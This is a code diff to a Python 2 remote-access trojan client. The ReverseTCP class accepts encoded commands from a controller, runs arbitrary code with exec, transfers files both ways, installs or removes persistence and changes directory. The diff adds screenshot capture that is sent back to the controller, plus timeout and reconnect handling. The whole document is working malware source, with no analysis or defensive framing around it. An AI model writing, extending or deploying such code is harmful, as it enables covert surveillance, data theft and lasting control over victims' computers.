@@ -5,13 +5,17 @@ import platform
 import socket
 import os
 import struct
-import tempfile
+import select
 import random
 import string
+from PIL import ImageGrab
 import sys
 import shutil
+import psutil
 import subprocess
 from time import sleep
+
+controlled_exit = False
 
 
 class Persistence:
@@ -84,7 +88,15 @@ class InformationGathering:
 
     @staticmethod
     def Screenshot():
-        pass
+        try:
+            image = ImageGrab.grab()
+            filename = ''.join(random.choice(string.ascii_letters) for _ in range(5))
+            filename += ".jpg"
+            filepath = os.path.join(os.environ['temp'], filename)
+            image.save(filepath)
+            return filepath
+        except Exception, e:
+            return 'Error: ' + str(e)
 
 
 class ReverseTCP:
@@ -140,6 +152,7 @@ class ReverseTCP:
     def InitializeSocket(self):
         try:
             self.socket = socket.socket()
+            self.socket.settimeout(10)
         except socket.error as e:
             self.PrintDebug('InitializeSocket [Error] -> %s' % str(e))
 
@@ -159,98 +172,108 @@ class ReverseTCP:
         return
 
     def DataParsing(self, data):
-        data = base64.b64decode(data)
-        if '+' * 5 in data:
-            try:
-                cmd = data.split('+' * 5)[1]
-                exec cmd
-                returnvalue = run()  # Output
-                self.send_msg(returnvalue)
-            except Exception as e:
-                self.send_msg(str(e))
-        elif data.startswith('download '):
-            try:
-                filename = data.split(' ')[1]
-                if os.path.isfile(filename):
-                    self.send_msg('\x11')
-                    confirm = self.recv_msg()
-                    if confirm == '\x13':
-                        self.send_msg(self.download_file(filename))
-                else:
-                    self.send_msg('\x12')
-            except ValueError:
-                self.send_msg('Error: expecting filename.')
-        elif data.startswith('upload '):
-            try:
-                filename = data.split(' ')[1]
-                self.send_msg('\x11')
-                body = self.recv_msg()
-                if body == '\x12':
-                    return
-                else:
-                    f = open(filename, 'wb')
-                    f.write(body)
-                    f.close()
-                    self.send_msg('\x13')
-            except Exception, e:
-                self.send_msg(str(e))
-            except ValueError:
-                self.send_msg('Error: expecting filename.')
-        elif data == 'screenshot':
-            filename = InformationGathering.Screenshot()
-            if not 'Error:' in filename:
+        try:
+            data = base64.b64decode(data)
+            if '+' * 5 in data:
                 try:
+                    cmd = data.split('+' * 5)[1]
+                    print cmd
+                    exec cmd
+                    returnvalue = run()  # Output
+                    self.send_msg(returnvalue)
+                except Exception as e:
+                    self.send_msg(str(e))
+            elif data.startswith('download '):
+                try:
+                    filename = data.split(' ')[1]
                     if os.path.isfile(filename):
                         self.send_msg('\x11')
                         confirm = self.recv_msg()
                         if confirm == '\x13':
                             self.send_msg(self.download_file(filename))
-                            os.remove(filename)
                     else:
                         self.send_msg('\x12')
                 except ValueError:
                     self.send_msg('Error: expecting filename.')
+            elif data.startswith('upload '):
+                try:
+                    filename = data.split(' ')[1]
+                    self.send_msg('\x11')
+                    body = self.recv_msg()
+                    if body == '\x12':
+                        return
+                    else:
+                        f = open(filename, 'wb')
+                        f.write(body)
+                        f.close()
+                        self.send_msg('\x13')
+                except Exception, e:
+                    self.send_msg(str(e))
+                except ValueError:
+                    self.send_msg('Error: expecting filename.')
+            elif data == 'screenshot':
+                filename = InformationGathering.Screenshot()
+                if not 'Error:' in filename:
+                    try:
+                        if os.path.isfile(filename):
+                            self.send_msg('\x11')
+                            confirm = self.recv_msg()
+                            if confirm == '\x13':
+                                self.send_msg(self.download_file(filename))
+                                os.remove(filename)
+                        else:
+                            self.send_msg('\x12')
+                    except ValueError:
+                        self.send_msg('- Error: expecting filename.')
+                else:
+                    self.send_msg(filename)
+            elif data.startswith('persistence '):
+                try:
+                    _, argument = data.split(' ')
+                    if argument == "install":
+                        prss = Persistence()
+                        output = prss.is_installed()
+                        if output:
+                            self.send_msg('* Persistence is already installed on the system.')
+                        else:
+                            output = prss.install()
+                            if output:
+                                self.send_msg('+ Persistence successfully installed.')
+                            else:
+                                self.send_msg('- ' + str(output))
+                    elif argument == "remove":
+                        prss = Persistence()
+                        output = prss.is_installed()
+                        if not output:
+                            self.send_msg('* Persistence is already removed from the system.')
+                        else:
+                            output = prss.clean()
+                            if output:
+                                self.send_msg('+ Persistence successfully removed.')
+                            else:
+                                self.send_msg('- ' + str(output))
+                    elif argument == "status":
+                        prss = Persistence()
+                        output = prss.is_installed()
+                        if output:
+                            self.send_msg('+ Persistence is installed on the system.')
+                        else:
+                            self.send_msg('- Persistence is not installed on the system.')
+                except Exception, e:
+                    self.send_msg(str(e))
+                except ValueError:
+                    self.send_msg('- Error: expecting argument.')
+            elif data.startswith('cd '):
+                try:
+                    folder = data.split(' ')[1]
+                    os.chdir(folder)
+                    self.send_msg(os.getcwd())
+                except Exception, e:
+                    self.send_msg('- ' + str(e))
             else:
-                self.send_msg(filename)
-        elif data.startswith('persistence '):
-            try:
-                _, argument = data.split(' ')
-                if argument == "install":
-                    prss = Persistence()
-                    output = prss.is_installed()
-                    if output:
-                        self.send_msg('* Persistence is already installed on the system.')
-                    else:
-                        output = prss.install()
-                        if output:
-                            self.send_msg('+ Persistence successfully installed.')
-                        else:
-                            self.send_msg('- ' + str(output))
-                elif argument == "remove":
-                    prss = Persistence()
-                    output = prss.is_installed()
-                    if not output:
-                        self.send_msg('* Persistence is already removed from the system.')
-                    else:
-                        output = prss.clean()
-                        if output:
-                            self.send_msg('+ Persistence successfully removed.')
-                        else:
-                            self.send_msg('- ' + str(output))
-                elif argument == "status":
-                    prss = Persistence()
-                    output = prss.is_installed()
-                    if output:
-                        self.send_msg('+ Persistence is installed on the system.')
-                    else:
-                        self.send_msg('- Persistence is not installed on the system.')
-            except Exception, e:
-                self.send_msg(str(e))
-            except ValueError:
-                self.send_msg('- Error: expecting argument.')
-
-        else:
-            self.send_msg('- Unrecognized command.')
+                self.send_msg('- Unrecognized command.')
+        except Exception, e:
+            self.send_msg('- ' + str(e))
 
     def CommandHandling(self):
         while True:
@@ -260,9 +283,11 @@ class ReverseTCP:
                     if data == '\x10':
                         break
                     elif data == '\x11':
-                        break
+                        return False
                     elif data == '\x07':
                         self.send_msg('\x08')
+                    elif data == '\x19':
+                        self.send_msg(self.host)
                     elif data == '\x99':
                         # Magic Byte
                         prss = Persistence()
@@ -275,13 +300,15 @@ class ReverseTCP:
                         self.DataParsing(data)
                 else:
                     self.send_msg('\x07')
+            except socket.timeout:
+                self.PrintDebug('Socket timeout.')
             except socket.error as e:
                 self.PrintDebug('SocketConnection.CallbackComm [Error] -> %s' % str(e))
-                break
+                return True
             except Exception, e:
                 self.PrintDebug('SocketConnection.UnhandledException [Error] -> %s' % str(e))
         self.socket.close()
-        return
+        return True
 
     def DormantHandler(self):
         while True:
@@ -291,14 +318,19 @@ class ReverseTCP:
                 data = self.recv_msg()
                 if data == '\x06':
                     self.send_msg('\x07')
-                    self.CommandHandling()
+                    if not self.CommandHandling():
+                        return False
+                    else:
+                        return True
                 elif data == '\x07':
                     self.send_msg('\x08')
                 elif data == '\x11':
-                    break
+                    return False
+            except socket.timeout:
+                continue
             except socket.error as e:
                 self.PrintDebug('SocketConnection.DormantHandler [Error] -> %s' % str(e))
-                break
+                return True
 
 
 def ConnectionHandler(rTCPv):
@@ -313,8 +345,10 @@ def ConnectionHandler(rTCPv):
 
 def CommandHandler(rTCPv):
     try:
-        rTCPv.DormantHandler()
-        return True
+        if not rTCPv.DormantHandler():
+            return False
+        else:
+            return True
     except Exception, e:
         rTCPv.PrintDebug('CommandHandler [Error] -> %s' % str(e))
     rTCPv.socket.close()
@@ -329,4 +363,6 @@ if __name__ == '__main__':
         rTCP.InitializeSocket()
         ConnectionHandler(rTCP)
         if CommandHandler(rTCP):
+            continue
+        else:
             break
